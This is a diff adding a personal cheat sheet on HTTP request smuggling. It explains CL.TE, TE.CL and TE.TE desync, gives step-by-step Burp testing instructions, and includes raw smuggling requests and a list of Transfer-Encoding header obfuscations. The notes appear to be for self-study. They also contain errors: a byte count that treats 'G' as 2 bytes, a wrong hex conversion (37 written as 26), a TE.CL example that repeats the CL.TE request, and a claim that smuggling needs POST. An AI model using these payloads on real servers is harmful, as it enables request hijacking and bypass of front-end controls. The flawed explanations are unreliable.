@@ -1,0 +1,144 @@
+-----------------------------------------------------------------------------+
+-----------------------------------------------------------------------------+
+Request Smuggling / HTTP DESYNC Attack
+-----------------------------------------------------------------------------+
+-----------------------------------------------------------------------------+
+
+~ Request smuggling is a vulenrability that arises when the front end and backend servers process a request in different ways ie using Content-Length and Transfer-Encoding 
+~ front end server could be a load balancer and backend the actual server
+~ https://www.youtube.com/watch?v=vO4BItoehZ0
+
+Important things to remember ------------------------+
+Content-Length
+Transfer-Encoding: chunked
+\r\n : size = 1 byte each
+Request Smuggling is done on POST request only, [ you can also change the GET request to POST ]
+make sure that update content length in burp is unchecked
+
+How Transfer-Encoding is used ------------------------+
+
+Transfer-Encoding: chunked
+
+7 ---> Mozilla contains 7 bytes, this is then converted to hex which in this case is also 7
+Mozilla
+10 --> the following contains 16 bytes, this is then converted to hex which is 10
+test-the-request 
+0 ---> informs the termination of the data
+
+
+How Content-Length is used ------------------------+
+
+Content-Length: 6 --> in rvery request header the CRLF characters are appended which are then also inclused int the conten--length thus 0=1 byte, 2 x \r\n =4 bytes and G= 2 bytes, total 6
+
+0\r\n
+\r\n
+G 
+
+
+How Does the Content-Length and Transfer-Encoding work togather in multiple servers ------------------------+
+
+Suppose you have a request with header:
+
+POST / HTTP/1.1
+Host: site.com
+Connection: keep-alive
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+Now if the Architecture is CL.TE then the Content-Length will be VERIFIED by the front server and relay the request, upto that many bytes, to the back server, since the back server PROCESSES the request using Transfer-Encoding it will treat the 0 as the termination of the request and leave the G unprocessed which will be added to the next request.
+
+
+
+-----------------------------------------------------------------------------+
+CL.TE
+-----------------------------------------------------------------------------+
+
+
+1) Load the POST request in burp and add the "Transfer-Encoding: chunked" header to the end of the request header
+
+2) calculate the total size of the request, including CRLF characters, convert them to hex , eg in the following the content length is actually 37, and converted to hex = 26, then add the transfer-encoding termination character to the request i.e. 0 [tip first send all the data using the update-content-length function enbled in burp, then use that content length an covert to hex ]
+
+26
+email=tester,password=testpass
+0
+
+3) send this request, if you get the same i.e. normal response go ahead , if not try TE.CL
+
+4) add another request for a page that is not on the server which should return a 404 not found error. eg 
+
+GET /hopefully404 HTTP/1.1
+X-Ignore: x
+
+5) if your first request goes normal and second request gives 404 not found error then it is vulnerable
+
+6) if you any error other the on eyou looking for (most cases 500 ) obfuscate the TE header. eg
+
+Transfer-Encoding: 	chunked
+
+
+-----------------------------------------------------------------------------+
+TE.CL
+-----------------------------------------------------------------------------+
+
+~ here the front server processes the Transfer-Encoding and backend server processes the content length
+~ if we specify the content length as 6 and add a termination character for Transfer encoding before the length of 6 is finished the backend will wait for the rest of the request to be sent, thus when the next request comes, it will treat it as a continuation of the previous request
+
+Suppose you have a request with header:
+
+POST / HTTP/1.1
+Host: site.com
+Connection: keep-alive
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+~ the front end server will only process upto the 0 and send this information to the backend server
+~ since the content length is specified as 6 , the back end will wait for the G to be sent which will be sent with the next request hence it will be smuggled in the next request
+
+
+-----------------------------------------------------------------------------+
+TE.TE obfuscating the TE header
+-----------------------------------------------------------------------------+
+~ when both the front and back server uses TE.TE, but one can be made not to process it by obfuscating the header in some way 
+~ To find TE.TE vulnerability, find variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it 
+~ depending whether the front or backend server ignores the TE, the request will then act as a TE.CL or CL.TE eg :
+
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+eg ------+
+POST / HTTP/1.1
+Host: site.com
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c --> this is hex encoded value
+GPOST / HTTP/1.1 --> see what option the website doesnt support and use that
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+-------+
